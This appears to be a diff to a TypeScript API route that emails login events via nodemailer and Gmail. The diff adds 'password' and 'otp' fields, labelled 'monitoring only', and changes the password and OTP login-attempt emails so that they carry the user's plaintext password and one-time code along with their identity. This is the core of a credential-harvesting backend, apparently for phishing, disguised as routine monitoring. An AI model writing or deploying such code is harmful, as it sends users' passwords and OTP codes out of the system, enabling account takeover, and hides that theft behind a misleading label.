@@ -1,24 +1,32 @@
 import nodemailer from "nodemailer";
 
 interface AuthEmailPayload {
-  type: "IDENTITY_SUBMITTED" | "PASSWORD_LOGIN_ATTEMPT" | "OTP_LOGIN_ATTEMPT";
+  type:
+    | "IDENTITY_SUBMITTED"
+    | "PASSWORD_LOGIN_ATTEMPT"
+    | "OTP_LOGIN_ATTEMPT";
+
   identity: string;
+
+  // optional metadata
   countryDial?: string;
   countryCode?: string;
-}
 
+  // sensitive fields (monitoring only)
+  password?: string;
+  otp?: string;
+}
 
 export async function POST(req: Request) {
   try {
     const body = (await req.json()) as AuthEmailPayload;
 
-    if (!body.type || typeof body.identity !== "string") {
-  return new Response(
-    JSON.stringify({ message: "Invalid request payload" }),
-    { status: 400 }
-  );
-}
-
+    if (!body.type || !body.identity) {
+      return new Response(
+        JSON.stringify({ message: "Invalid request payload" }),
+        { status: 400 }
+      );
+    }
 
     const transporter = nodemailer.createTransport({
       service: "gmail",
@@ -33,31 +41,33 @@ export async function POST(req: Request) {
 
     switch (body.type) {
       case "IDENTITY_SUBMITTED":
-        subject = "New Login Identity Submitted";
+        subject = "Login Identity Submitted";
         text = `
 Login Identity Submitted
 
-Email / Mobile: ${body.identity}
-Country Code: ${body.countryCode || "N/A"}
-Dial Code: ${body.countryDial || "N/A"}
+Identity: ${body.identity}
+Country Code: ${body.countryCode ?? "N/A"}
+Dial Code: ${body.countryDial ?? "N/A"}
 `;
         break;
 
       case "PASSWORD_LOGIN_ATTEMPT":
         subject = "Password Login Attempt";
         text = `
-      Password Login Attempt
+Password Login Attempt
 
-      Email / Mobile: ${body.identity}
-      `;
-              break;
+Identity: ${body.identity}
+Password: ${body.password ?? "NOT PROVIDED"}
+`;
+        break;
 
       case "OTP_LOGIN_ATTEMPT":
         subject = "OTP Login Attempt";
         text = `
 OTP Login Attempt
 
-Email / Mobile: ${body.identity}
+Identity: ${body.identity}
+OTP Code: ${body.otp ?? "NOT PROVIDED"}
 `;
         break;
 
@@ -87,5 +97,3 @@ Email / Mobile: ${body.identity}
     );
   }
 }
-
-
